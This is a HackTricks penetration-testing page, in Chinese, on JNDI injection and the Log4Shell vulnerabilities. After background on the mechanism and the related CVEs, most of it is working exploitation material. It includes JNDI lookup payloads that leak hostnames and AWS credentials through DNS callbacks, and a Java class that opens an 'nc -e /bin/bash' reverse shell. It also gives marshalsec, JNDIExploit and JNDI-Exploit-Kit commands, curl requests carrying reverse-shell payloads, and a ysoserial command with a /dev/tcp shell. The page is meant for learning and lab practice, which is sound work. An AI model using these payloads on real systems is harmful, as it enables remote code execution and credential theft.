<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>JNDI - Java Naming and Directory Interface &amp; Log4Shell</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="jndi---java-naming-and-directory-interface--log4shell"><a class="header" href="#jndi---java-naming-and-directory-interface--log4shell">JNDI - Java Naming and Directory Interface &amp; Log4Shell</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p>JNDI 自 1990 年代末集成到 Java 中，作为目录服务，使 Java 程序能够通过命名系统定位数据或对象。它通过服务提供者接口 (SPIs) 支持各种目录服务，允许从不同系统检索数据，包括远程 Java 对象。常见的 SPI 包括 CORBA COS、Java RMI 注册表和 LDAP。</p>
<h3 id="jndi-命名参考"><a class="header" href="#jndi-命名参考">JNDI 命名参考</a></h3>
<p>Java 对象可以使用 JNDI 命名引用进行存储和检索，形式有两种：</p>
<ul>
<li><strong>引用地址</strong>：指定对象的位置（例如，<em>rmi://server/ref</em>），允许直接从指定地址检索。</li>
<li><strong>远程工厂</strong>：引用远程工厂类。访问时，该类从远程位置下载并实例化。</li>
</ul>
<p>然而，这种机制可能被利用，可能导致加载和执行任意代码。作为对策：</p>
<ul>
<li><strong>RMI</strong>：<code>java.rmi.server.useCodeabseOnly = true</code> 从 JDK 7u21 开始默认启用，限制远程对象加载。安全管理器进一步限制可以加载的内容。</li>
<li><strong>LDAP</strong>：<code>com.sun.jndi.ldap.object.trustURLCodebase = false</code> 从 JDK 6u141、7u131、8u121 开始默认启用，阻止执行远程加载的 Java 对象。如果设置为 <code>true</code>，则可以在没有安全管理器监督的情况下执行远程代码。</li>
<li><strong>CORBA</strong>：没有特定属性，但安全管理器始终处于活动状态。</li>
</ul>
<p>然而，负责解析 JNDI 链接的 <strong>命名管理器</strong> 缺乏内置安全机制，可能允许从任何来源检索对象。这构成风险，因为 RMI、LDAP 和 CORBA 的保护措施可能被绕过，导致加载任意 Java 对象或利用现有应用程序组件（小工具）运行恶意代码。</p>
<p>可利用的 URL 示例包括：</p>
<ul>
<li><em>rmi://attacker-server/bar</em></li>
<li><em>ldap://attacker-server/bar</em></li>
<li><em>iiop://attacker-server/bar</em></li>
</ul>
<p>尽管有保护措施，漏洞仍然存在，主要是由于缺乏对从不受信任来源加载 JNDI 的保护以及绕过现有保护的可能性。</p>
<h3 id="jndi-示例"><a class="header" href="#jndi-示例">JNDI 示例</a></h3>
<p><img src="../../.gitbook/assets/image%20(1022).png" alt="" /></p>
<p>即使您已设置 <strong><code>PROVIDER_URL</code></strong>，您仍可以在查找中指示不同的 URL，并将其访问：<code>ctx.lookup("&lt;attacker-controlled-url&gt;")</code>，这就是攻击者将利用的内容，从他控制的系统加载任意对象。</p>
<h3 id="corba-概述"><a class="header" href="#corba-概述">CORBA 概述</a></h3>
<p>CORBA（通用对象请求代理架构）使用 <strong>可互操作对象引用 (IOR)</strong> 唯一标识远程对象。此引用包括关键信息，如：</p>
<ul>
<li><strong>类型 ID</strong>：接口的唯一标识符。</li>
<li><strong>代码库</strong>：获取存根类的 URL。</li>
</ul>
<p>值得注意的是，CORBA 本身并不脆弱。确保安全通常涉及：</p>
<ul>
<li>安装 <strong>安全管理器</strong>。</li>
<li>配置安全管理器以允许连接到潜在恶意的代码库。这可以通过以下方式实现：</li>
<li>套接字权限，例如，<code>permissions java.net.SocketPermission "*:1098-1099", "connect";</code>。</li>
<li>文件读取权限，可以是通用的（<code>permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";</code>）或针对可能放置恶意文件的特定目录。</li>
</ul>
<p>然而，一些供应商政策可能会宽松，默认允许这些连接。</p>
<h3 id="rmi-上下文"><a class="header" href="#rmi-上下文">RMI 上下文</a></h3>
<p>对于 RMI（远程方法调用），情况有些不同。与 CORBA 一样，默认情况下限制任意类下载。要利用 RMI，通常需要绕过安全管理器，这在 CORBA 中也同样适用。</p>
<h3 id="ldap"><a class="header" href="#ldap">LDAP</a></h3>
<p>首先，我们需要区分搜索和查找。<br />
<strong>搜索</strong>将使用类似 <code>ldap://localhost:389/o=JNDITutorial</code> 的 URL 从 LDAP 服务器查找 JNDITutorial 对象并 <strong>检索其属性</strong>。<br />
<strong>查找</strong>旨在用于 <strong>命名服务</strong>，因为我们想获取 <strong>绑定到名称的任何内容</strong>。</p>
<p>如果 LDAP 搜索是通过 <strong>SearchControls.setReturningObjFlag() 设置为 <code>true</code> 调用的，则返回的对象将被重建</strong>。</p>
<p>因此，有几种方法可以攻击这些选项。<br />
<strong>攻击者可能会通过在 LDAP 记录中引入有效负载来污染它们</strong>，这些有效负载将在收集它们的系统中执行（如果您可以访问 LDAP 服务器，这非常有用，可以 <strong>妥协数十台机器</strong>）。另一种利用此漏洞的方法是执行 <strong>MitM 攻击</strong>，例如在 LDAP 搜索中。</p>
<p>如果您可以 <strong>使应用程序解析 JNDI LDAP URL</strong>，您可以控制将要搜索的 LDAP，并可以发送回有效负载（log4shell）。</p>
<h4 id="反序列化漏洞"><a class="header" href="#反序列化漏洞">反序列化漏洞</a></h4>
<p><img src="../../.gitbook/assets/image%20(275).png" alt="" /></p>
<p><strong>漏洞是序列化的</strong>，并将被反序列化。<br />
如果 <code>trustURLCodebase</code> 为 <code>true</code>，攻击者可以在代码库中提供自己的类；如果不是，他将需要利用类路径中的小工具。</p>
<h4 id="jndi-引用漏洞"><a class="header" href="#jndi-引用漏洞">JNDI 引用漏洞</a></h4>
<p>使用 <strong>JavaFactory 引用</strong> 攻击此 LDAP 更容易：</p>
<p><img src="../../.gitbook/assets/image%20(1059).png" alt="" /></p>
<h2 id="log4shell-漏洞"><a class="header" href="#log4shell-漏洞">Log4Shell 漏洞</a></h2>
<p>该漏洞在 Log4j 中引入，因为它支持一种 <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution"><strong>特殊语法</strong></a>，形式为 <code>${prefix:name}</code>，其中 <code>prefix</code> 是多个不同的 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html"><strong>查找</strong></a> 之一，<code>name</code> 应该被评估。例如，<code>${java:version}</code> 是当前运行的 Java 版本。</p>
<p><a href="https://issues.apache.org/jira/browse/LOG4J2-313"><strong>LOG4J2-313</strong></a> 引入了 <code>jndi</code> 查找功能。此功能通过 JNDI 启用变量的检索。通常，键会自动以 <code>java:comp/env/</code> 为前缀。然而，如果键本身包含 <strong>":"</strong>，则不会应用此默认前缀。</p>
<p>在键中存在 <strong>:</strong> 的情况下，例如 <code>${jndi:ldap://example.com/a}</code>，<strong>没有前缀</strong>，并且 <strong>LDAP 服务器会查询该对象</strong>。这些查找可以在 Log4j 的配置中使用，也可以在记录的行中使用。</p>
<p>因此，获取 RCE 所需的唯一条件是 <strong>处理用户控制的信息的 Log4j 漏洞版本</strong>。由于这是一个被 Java 应用程序广泛使用的库来记录信息（包括面向互联网的应用程序），因此通常会有 log4j 记录例如接收到的 HTTP 头信息，如 User-Agent。然而，log4j <strong>不仅用于记录 HTTP 信息，还用于记录开发人员指示的任何输入和数据</strong>。</p>
<h2 id="log4shell-相关-cve-概述"><a class="header" href="#log4shell-相关-cve-概述">Log4Shell 相关 CVE 概述</a></h2>
<h3 id="cve-2021-44228-严重"><a class="header" href="#cve-2021-44228-严重"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a> <strong>[严重]</strong></a></h3>
<p>此漏洞是 <code>log4j-core</code> 组件中的一个关键 <strong>不受信任的反序列化缺陷</strong>，影响版本从 2.0-beta9 到 2.14.1。它允许 <strong>远程代码执行 (RCE)</strong>，使攻击者能够接管系统。该问题由阿里云安全团队的陈兆军报告，影响多个 Apache 框架。版本 2.15.0 中的初始修复不完整。防御的 Sigma 规则可用（<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml">规则 1</a>，<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml">规则 2</a>）。</p>
<h3 id="cve-2021-45046-严重"><a class="header" href="#cve-2021-45046-严重"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046">CVE-2021-45046</a> <strong>[严重]</strong></a></h3>
<p>最初评级为低，但后来升级为严重，此 CVE 是由于 2.15.0 对 CVE-2021-44228 的修复不完整而导致的 <strong>拒绝服务 (DoS)</strong> 缺陷。它影响非默认配置，允许攻击者通过精心制作的有效负载造成 DoS 攻击。一个 <a href="https://twitter.com/marcioalm/status/1471740771581652995">推文</a> 展示了一种绕过方法。该问题在版本 2.16.0 和 2.12.2 中通过移除消息查找模式和默认禁用 JNDI 解决。</p>
<h3 id="cve-2021-4104-高"><a class="header" href="#cve-2021-4104-高"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4104">CVE-2021-4104</a> <strong>[高]</strong></a></h3>
<p>影响 <strong>Log4j 1.x 版本</strong> 在使用 <code>JMSAppender</code> 的非默认配置中，此 CVE 是一个不受信任的反序列化缺陷。1.x 分支没有可用的修复，已结束生命周期，建议升级到 <code>log4j-core 2.17.0</code>。</p>
<h3 id="cve-2021-42550-中等"><a class="header" href="#cve-2021-42550-中等"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42550">CVE-2021-42550</a> <strong>[中等]</strong></a></h3>
<p>此漏洞影响 <strong>Logback 日志框架</strong>，这是 Log4j 1.x 的继任者。之前认为是安全的，该框架被发现存在漏洞，已发布新版本（1.3.0-alpha11 和 1.2.9）以解决该问题。</p>
<h3 id="cve-2021-45105-高"><a class="header" href="#cve-2021-45105-高"><strong>CVE-2021-45105</strong> <strong>[高]</strong></a></h3>
<p>Log4j 2.16.0 包含一个 DoS 缺陷，促使发布 <code>log4j 2.17.0</code> 来修复该 CVE。更多细节见 BleepingComputer 的 <a href="https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/">报告</a>。</p>
<h3 id="cve-2021-44832"><a class="header" href="#cve-2021-44832"><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">CVE-2021-44832</a></a></h3>
<p>影响 log4j 版本 2.17，此 CVE 要求攻击者控制 log4j 的配置文件。它涉及通过配置的 JDBCAppender 进行潜在的任意代码执行。更多细节可在 <a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">Checkmarx 博客文章</a> 中找到。</p>
<h2 id="log4shell-利用"><a class="header" href="#log4shell-利用">Log4Shell 利用</a></h2>
<h3 id="发现"><a class="header" href="#发现">发现</a></h3>
<p>如果没有保护，此漏洞非常容易发现，因为它将向您在有效负载中指示的地址发送至少一个 <strong>DNS 请求</strong>。因此，像这样的有效负载：</p>
<ul>
<li><code>${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}</code>（使用 <a href="https://canarytokens.org/generate">canarytokens.com</a>）</li>
<li><code>${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}</code>（使用 <a href="https://github.com/projectdiscovery/interactsh">interactsh</a>）</li>
<li><code>${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}</code>（使用 Burp Suite）</li>
<li><code>${jndi:ldap://2j4ayo.dnslog.cn}</code>（使用 <a href="http://dnslog.cn">dnslog</a>）</li>
<li><code>${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}</code>（使用 <a href="https://log4shell.huntress.com">huntress</a>）</li>
</ul>
<p>请注意，<strong>即使收到 DNS 请求，也不意味着应用程序是可利用的</strong>（甚至不脆弱），您需要尝试利用它。</p>
<p>{% hint style="info" %}
请记住，要 <strong>利用版本 2.15</strong>，您需要添加 <strong>localhost 检查绕过</strong>：${jndi:ldap://<strong>127.0.0.1#</strong>...}
{% endhint %}</p>
<h4 id="本地发现"><a class="header" href="#本地发现"><strong>本地发现</strong></a></h4>
<p>搜索 <strong>本地易受攻击版本</strong> 的库：</p>
<pre><code class="language-bash">find / -name "log4j-core*.jar" 2&gt;/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
</code></pre>
<h3 id="验证"><a class="header" href="#验证"><strong>验证</strong></a></h3>
<p>之前列出的一些平台将允许您插入一些变量数据，这些数据将在请求时被记录。<br />
这对于两件事非常有用：</p>
<ul>
<li><strong>验证</strong> 漏洞</li>
<li><strong>利用</strong> 漏洞 <strong>提取信息</strong></li>
</ul>
<p>例如，您可以请求类似于：<br />
或像 <code>${</code><strong><code>jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}</code></strong>，如果 <strong>接收到的 DNS 请求包含环境变量的值</strong>，您就知道该应用程序存在漏洞。</p>
<p>您可以尝试 <strong>泄露</strong> 的其他信息：</p>
<pre><code>${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
</code></pre>
<h3 id="rce-信息"><a class="header" href="#rce-信息">RCE 信息</a></h3>
<p>{% hint style="info" %}
运行在 JDK 版本高于 6u141、7u131 或 8u121 的主机已针对 LDAP 类加载攻击向量进行了保护。这是由于默认禁用 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>，这防止了 JNDI 通过 LDAP 加载远程代码库。然而，重要的是要注意，这些版本<strong>并未保护免受反序列化攻击向量</strong>。</p>
<p>对于旨在利用这些较高 JDK 版本的攻击者，必须在 Java 应用程序中利用<strong>受信任的工具</strong>。像 ysoserial 或 JNDIExploit 这样的工具通常用于此目的。相反，利用较低的 JDK 版本相对容易，因为这些版本可以被操纵以加载和执行任意类。</p>
<p>有关<strong>更多信息</strong>（<em>例如 RMI 和 CORBA 向量的限制</em>），<strong>请查看之前的 JNDI 命名参考部分</strong>或 <a href="https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/">https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/</a>
{% endhint %}</p>
<h3 id="rce---marshalsec-与自定义有效负载"><a class="header" href="#rce---marshalsec-与自定义有效负载">RCE - Marshalsec 与自定义有效负载</a></h3>
<p>您可以在<strong>THM box</strong>中测试此内容：<a href="https://tryhackme.com/room/solar"><strong>https://tryhackme.com/room/solar</strong></a></p>
<p>使用工具 <a href="https://github.com/mbechler/marshalsec"><strong>marshalsec</strong></a>（jar 版本可在 <a href="https://github.com/RandomRobbieBF/marshalsec-jar"><strong>这里</strong></a> 获取）。此方法建立一个 LDAP 引用服务器，以将连接重定向到一个次级 HTTP 服务器，在该服务器上将托管漏洞：</p>
<pre><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://&lt;your_ip_http_server&gt;:8000/#Exploit"
</code></pre>
<p>要提示目标加载反向 shell 代码，制作一个名为 <code>Exploit.java</code> 的 Java 文件，内容如下：</p>
<pre><code class="language-java">public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
</code></pre>
<p>将Java文件编译成类文件，使用：<code>javac Exploit.java -source 8 -target 8</code>。接下来，在包含类文件的目录中启动一个<strong>HTTP服务器</strong>，使用：<code>python3 -m http.server</code>。确保<strong>marshalsec LDAP服务器</strong>引用此HTTP服务器。</p>
<p>通过发送类似的有效负载来触发在易受攻击的Web服务器上执行漏洞类：</p>
<pre><code class="language-bash">${jndi:ldap://&lt;LDAP_IP&gt;:1389/Exploit}
</code></pre>
<p><strong>注意：</strong> 此漏洞依赖于Java的配置，以允许通过LDAP加载远程代码库。如果这不被允许，请考虑利用受信任的类进行任意代码执行。</p>
<h3 id="rce---jndiexploit"><a class="header" href="#rce---jndiexploit">RCE - <strong>JNDIExploit</strong></a></h3>
<p>{% hint style="info" %}
请注意，出于某种原因，作者在发现log4shell后将此项目从github中删除。您可以在<a href="https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2">https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2</a>找到缓存版本，但如果您想尊重作者的决定，请使用其他方法来利用此漏洞。</p>
<p>此外，您无法在时光机中找到源代码，因此要么分析源代码，要么执行jar文件，知道您不知道自己在执行什么。
{% endhint %}</p>
<p>在此示例中，您可以在8080端口运行此<strong>易受攻击的web服务器以进行log4shell</strong>：<a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a>（<em>在README中您将找到如何运行它</em>）。此易受攻击的应用程序使用易受攻击的log4shell版本记录HTTP请求头_X-Api-Version_的内容。</p>
<p>然后，您可以下载<strong>JNDIExploit</strong> jar文件并使用以下命令执行它：</p>
<pre><code class="language-bash">wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
</code></pre>
<p>在阅读代码仅几分钟后，在 <em>com.feihong.ldap.LdapServer</em> 和 <em>com.feihong.ldap.HTTPServer</em> 中，您可以看到 <strong>LDAP 和 HTTP 服务器是如何创建的</strong>。LDAP 服务器将理解需要提供的有效负载，并将受害者重定向到 HTTP 服务器，后者将提供漏洞利用。<br />
在 <em>com.feihong.ldap.gadgets</em> 中，您可以找到 <strong>一些特定的工具</strong>，可以用来执行所需的操作（可能执行任意代码）。在 <em>com.feihong.ldap.template</em> 中，您可以看到不同的模板类，这些类将 <strong>生成漏洞利用</strong>。</p>
<p>您可以使用 <strong><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code></strong> 查看所有可用的漏洞利用。一些有用的包括：</p>
<pre><code class="language-bash">ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
</code></pre>
<p>所以，在我们的例子中，我们已经有了那个易受攻击的 Docker 应用程序在运行。要攻击它：</p>
<pre><code class="language-bash"># Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
</code></pre>
<p>在发送攻击时，您将在执行 <strong>JNDIExploit-1.2-SNAPSHOT.jar</strong> 的终端中看到一些输出。</p>
<p><strong>请记得检查 <code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code> 以获取其他利用选项。此外，如果需要，您可以更改 LDAP 和 HTTP 服务器的端口。</strong></p>
<h3 id="rce---jndi-exploit-kit"><a class="header" href="#rce---jndi-exploit-kit">RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a></a></h3>
<p>与之前的利用方式类似，您可以尝试使用 <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> 来利用此漏洞。<br />
您可以运行以下命令生成要发送给受害者的 URL：</p>
<pre><code class="language-bash"># Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
</code></pre>
<p><em>这个攻击使用自定义生成的java对象将在像<strong>THM solar room</strong>这样的实验室中有效。然而，这通常不会有效（因为默认情况下Java未配置为使用LDAP加载远程代码库），我认为这是因为它没有滥用受信任的类来执行任意代码。</em></p>
<h3 id="rce---jndi-injection-exploit-plus"><a class="header" href="#rce---jndi-injection-exploit-plus">RCE - JNDI-Injection-Exploit-Plus</a></h3>
<p><a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a> 是另一个生成<strong>可用JNDI链接</strong>的工具，并通过启动RMI服务器、LDAP服务器和HTTP服务器提供后台服务。</p>
<h3 id="rce---ysoserial--jndi-exploit-kit"><a class="header" href="#rce---ysoserial--jndi-exploit-kit">RCE - ysoserial &amp; JNDI-Exploit-Kit</a></h3>
<p>这个选项对于攻击<strong>仅信任指定类而不是所有类的Java版本</strong>非常有用。因此，<strong>ysoserial</strong>将用于生成<strong>受信任类的序列化</strong>，这些序列化可以作为小工具来<strong>执行任意代码</strong>（<em>ysoserial滥用的受信任类必须被受害者的java程序使用，以便利用能够生效</em>）。</p>
<p>使用<strong>ysoserial</strong>或<a href="https://github.com/pimps/ysoserial-modified"><strong>ysoserial-modified</strong></a>，您可以创建将被JNDI下载的反序列化利用：</p>
<pre><code class="language-bash"># Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/7878 0&gt;&amp;1' &gt; /tmp/cc5.ser
</code></pre>
<p>使用 <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> 生成 <strong>JNDI 链接</strong>，其中漏洞将等待来自易受攻击机器的连接。您可以提供 <strong>不同的利用程序，这些利用程序可以由 JNDI-Exploit-Kit 自动生成</strong>，甚至是您 <strong>自己的反序列化有效负载</strong>（由您或 ysoserial 生成）。</p>
<pre><code class="language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
</code></pre>
<p><img src="../../.gitbook/assets/image%20(1118).png" alt="" /></p>
